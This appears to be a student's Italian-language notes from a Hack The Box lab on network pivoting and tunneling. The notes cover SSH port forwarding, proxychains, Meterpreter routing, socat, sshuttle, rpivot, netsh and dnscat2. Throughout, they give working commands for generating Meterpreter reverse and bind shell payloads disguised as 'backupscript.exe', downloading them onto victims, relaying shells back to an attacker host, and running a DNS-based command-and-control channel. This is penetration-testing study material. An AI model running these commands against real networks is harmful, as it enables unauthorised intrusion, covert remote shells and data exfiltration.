# Introduction

Spesso durante red team engagement ci si puo' trovare in situazioni dove abbiamo compromesso credenziali, chiavi ssh etc. etc. e dobbiamo muoverci su un altro host ma 
potrebbero esserci host non direttamente raggiungibili dal nostro attack host.

Percio' avremmo bisogno di un **pivot host**. 

Prima cosa da controllare e' il nostro livello di privilegi, le connessioni attive e potenziali VPN o altri software di accesso remoto.

Se un host ha piu' di un network adapter probabilmente si puo' muovere in un altro segmento di rete.

L' utilizzo principale del pivoting e' di entrare reti isolate. il **Tunneling** invece e' un sottoinsieme del pivoting, consiste nell'incapsulare il traffico di rete
in un altro protocollo e routare il traffico attraverso questo protocollo, Tipo le VPN o dei browser offrono il tunneling.

**Lateral Movement**, e definito come una tecnica per accedere ad host, applicazioni e servizi addizionali in una rete.

# Networking behind Pivoting

## IP Addressing & NIC

Un indirizzo IP, (Statico o dinamico) e' assegnato ad un' interfaccia detta **NIC(Network Interface Controller)** , detto anche network adapter. Un computer puo' avere
Piu' interfacce di rete (fisiche e virtuali).

### Visualizzare interfacce di rete
`ifconfig`, Linux

`ipconfig`, Windows

## Routing

Ogni computer puo' essere un router in una rete.

### Visualizzare la routing tabke
`netstat -r`

Il gateway sara' l'IP a cui manderemo la roba per raggiungere la destinazione.


# Dynamic Port Forwarding with SSH and SOCKS Tunneling

il **Port Forwarding** e' una tecnica che ci permette di redirectare una richiesta di comunicazione da una porta ad un'altra.

Il port forwarding usa TCP come layer primario di comunicazione, pero' altri protocolli tipo SSH o SOCKS puo' encapsulare il traffico. Questo e' molto utile per bypassare 
firewall e pivotare in altre reti.

### SSH Local Port Forwarding
![image](https://github.com/user-attachments/assets/5132cade-7719-4e64-bc72-928ba6e5fdbe)

### Scanning
```
j4k1dibe@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

Vediamo SSH aperta, MySQL chiusa. Se vogliamo comunicare con MySQL possiamo

### Executing Local Port Forward. OVviamente abbiamo bisogno della password SSH
`j4k1dibe@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64`

`j4k1dibe@htb[/htb]$ netstat -antp | grep 1234` per confermare 

la flag **-L** dice al server SSH di inoltrare tutti i dati mandati a porta 1234 a localhost:3306 sul server ubuntu.

### Checkiamo che ha funzionato con Nmap
```
j4k1dibe@htb[/htb]$ nmap -v -sV -p1234 localhost
PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3

```

### Forwarding multiple ports

`j4k1dibe@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64`


## Setting up to pivot
Mettiamo caso che siamo entrati su una macchina. ha 3 interfacce e non sappiamo cosa c'e' nella rete accessibile tramite queste interfacce.

Non possimao fare le scan direttamente dal nostro attack host. Abbiamo bisogno di fare dynamic port forwarding e pivotare i nostri pacchetti di rete al server ubuntu.

Possiamo fare startando un **SOCKS Listener** nel nostro local host, e configurare SSH nella macchina vittima per forwardare quel traffico via SSH.
Sta roba si dice **SSH Tunneling over SOCKS proxy**.

A differenza di molti casi in cui tu dovresti iniziare una connessione per connetterti ad un servizio, con i server SOCKS il traffico iniziale e' generato dal SOCKS client
che si connette al SOCKS server controllato dall' utente (Una sorta di reverse shell, stesso concetto).

Questa tecnica e' molto spesos usata per aggirare restrizioni messe dai firewall e permettere ad un entita' esterna di bypassare il firewall, o per entrare in reti nattate.



### Esempio

La nostra macchina attaccante si puo' connettere a **ens192**

```
ubuntu@WEB01:~$ ifconfig 

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
        RX packets 35571  bytes 177919049 (177.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10452  bytes 1474767 (1.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
        RX packets 8251  bytes 1125190 (1.1 MB)
        RX errors 0  dropped 40  overruns 0  frame 0
        TX packets 1538  bytes 123584 (123.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 270  bytes 22432 (22.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 270  bytes 22432 (22.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### Enabling Dynamic port forwarding with ssh
`j4k1dibe@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64`

Una volta abilitato questo avremo bisogno di un tool che routa ogni pacchetto sulla porta 9050. Un tool adatto e' **proxychains** che e' capace di redirectare una
connessione TCP attraverso TOR, SOCKS, HTTP.

Per informare proxychains che dobbiamo usare porta 9050 dobbiamo modificarre le configurazioni dentro **/etc/proxychains.conf** aggiungendo `socks4 127.0.0.1 9050`.

```
j4k1dibe@htb[/htb]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

### Using Nmap with Proxychains 
Qui e' una scan a tutta una rete, ci vorra' molto tempo immagino.

`j4k1dibe@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200`


### Enumerating a target
Quando finalmente troviamo un IP valido possiamo fare una scan normale

`j4k1dibe@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19`


### Proxychains metasploit
Si puo' usare anche metasploit con proxychains. Semplicemente deve essere startato con il comando:

`proxychains msfconsole`

### Xfreerdp con proxychains

`j4k1dibe@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`


# Remote/Reverse Port Forwarding with SSH

Per ora abbiamo visto local port forwarding dove SSH puo' ascoltare nella nostra macchina locale e forwardare un servizio remoto ad una porta nostra.


Ma se invece vogliamo una reverse shell?

Se startiamo un Listener nella nostra macchina la vittima non riuscira' a raggiungerci.

In questi casi dovremmo trovare un pivot host che e' una connessione comune tra il nostro attack host e la vittima

### Creare il payload con msfvenom
QUindi come LHOST metteremo non il nostro IP ma quello del pivot

`j4k1dibe@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`

### Trasferiamo payload al pivot host
`j4k1dibe@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`

### Scarichiamo payload wulla vittima

`ubuntu@Webserver$ python3 -m http.server 8123`, startiamo server http sul pivot host

`PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`, scarichiamo al pivot sulla vittima

### Usiamo SSH -R
`j4k1dibe@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`

Se ci eravamo messi in ascolto sulla macchina principale cosi' riceviamo una shell.


# Meterpreter Tunneling & Port Forwarding

Consideriamo lo scenario dove la nostra shell di meterpreter ha accesso al pivot host.

### Creating payload for pivot

`j4k1dibe@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080`

`msf6 > use exploit/multi/handler` settiamo handler 

### Ping Sweep
dentro la sessione meterpreter possiamo runnare questo modulo metasploit per vedere dentro la rete e pingare gli host

`meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`

`for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done` Ping sweep in linux

`for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"` Ping sweep in CMD

`1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` Ping sweep in PowerShell


### Configuriamo un MSF's SOCKS Proxy
```
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
```

`socks4 	127.0.0.1 9050` Aggiungiamo questa line in fondo a /etc/proxychains.conf

### Creating Routes with AutoRoute

Ora possiamo dire al nostro socks_proxy module di routare tutto il traffico tramite la nostra sessione di meterpreter usando **pust/multi/manage/autoroute** per aggiungere route per la subnet.

```
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

`meterpreter > run autoroute -s 172.16.5.0/23`. piu' semplice

### Listing active routes with autoroutes
`meterpreter > run autoroute -p`

### Testing Porxy & Routing Functionality
`j4k1dibe@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`

## Port Forwarding with MSF

`meterpreter > help portfwd`

### Create a local TCP relay
Praticamente starta un listener nella porta 3300 nel nostro attack host e forwarda tutto i pacchetti al server remoto sulla porta 3389

`meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19` 

Ora possiamo tipo anche eseguire xfreerdp sul nostro localhost porta 3300

`j4k1dibe@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123`

`j4k1dibe@htb[/htb]$ netstat -antp`, per vedere info sulle robe fatte

## MEterpreter Reverse Port Forwarding

Metasploit puo' anche fare reverse port forwarding. quindi si ascolta su una porta sul server compromesso e forwarda tutto al pivot server

`meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`. -l e' la porta sul nostro host attaccante

Poi ci mettiamo in ascolto con meterpreter


# Socat Redirection with a Reverse Shell

Socat e' un tool di relay bidirezionale che permette di creare pipe sockets tra 2 reti indipendenti senza usare SSH.

Si comporta come un redirector che puo' ascoltare su un host e forwardare i dati ad un altro IP.

### Starting Socat Listener
`ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`, sul pivot server

### Creare il payload

`j4k1dibe@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080`

mettersi in ascolto su 0.0.0.0

# Socat Redirection con una Bind Shell

Possiamo redirectre pure bind shell

### Creiamo il payload
`[!bash!]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443`

### Startiamo il listener su pivot server
`ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443`


# SSH for Windows: plink.exe

Plink, che sta per (PuTTY Link) e' un tool command line parte del paccehtto PuTTY. Plink puo' essere usato per creare dynamic port forwards e SOCKS proxies.

Prima del 2018 WIndows non aveva nativo SSH client, percio' molti usavano PuTTY.

### Usare Plink.exe
`plink -ssh -D 9050 ubuntu@10.129.15.50`


Un altro tool windows-based e' Proxifier e puo' essere usato per iniziare SOCKS tunner via SSH

# SSH Pivoting with Sshuttle
**Sshuttle** e' un tool in python che rimuove la necessita' di configurare proxychains. Pero' questo tool funziona solo over SSH e non da' opzione di pivotare over TOR o HTTPS.

Puo' essere molto utile per automatizzare esecuzione di iptables e aggiungere pivot rules all' host remoto.

`j4k1dibe@htb[/htb]$ sudo apt-get install sshuttle`

### Running sshuttle
`j4k1dibe@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v `

### Traffic routing via Ipdatbles routes

`j4k1dibe@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn`


# Web Server Pivoting with Rpivot

**Rpivot** e' un tool di reverse SOCKS proxy scritto in python per SOCKS tunneling. Rpivot binda una macchina dentro una rete aziendale ad un server esterno ed espone la porta local del client server side

### iNSTALLATION

`j4k1dibe@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git`

`j4k1dibe@htb[/htb]$ sudo apt-get install python2.7`


### Execution
`j4k1dibe@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` sulla macchina attaccante

`j4k1dibe@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/` trasferiamo client.py sulla macchina pivot

`ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`, runniamo client.py sul pivot

### Browsing the target webserver con proxychahins
`proxychains firefox-esr 172.16.5.135:80`

### COnnettersi ad un webserver usando HTTP_Proxy & NTLM Auth
`python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>`


# Port Forwarding with Windows Netsh

**Netsh** e' un windows command line tool che aiuta a fare configurazioni di rete

### USare Netsh per fare port forward
`C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`

### Verifying port forward
`C:\Windows\system32> netsh.exe interface portproxy show v4tov4`


# DNS Tunneling with Dnscat2

Dnscat2 e' un tunneling tool che usa il protocollo DNS per mandare dati tra due host. Usa un encrypted C2 chalnnel e manda i dati dentro i record TXT.

Tipicamente ogni environment Active Directory ha il suo server DNS quindi quelli dentro chiameranno dei server DNS interni. Pero' con dnscat2 l' address resolution e' richiesta ad un server esterno.

Dnscat2 puo' essere un approccio molto stealthy per esfiltrare dati ed evadere firewall detection.

Ad esemio possiamo usare dnscat2 server sul nostro attack host e il client sulla vittima.

```
j4k1dibe@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

### Starting dnscat2 server
`j4k1dibe@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`

### Running dnscat2 on victim windows

`j4k1dibe@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git`, PRima scarico su attack host

`PS C:\htb> Import-Module .\dnscat2.ps1`, lo scarico sulla vittima ed eseguo
`PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd `

su **preshared secret** ci va il secret prima generato dal server.

`dnscat2> ?`. Listing options

### Avviare una shell/windows
`dnscat2> window -i 1`
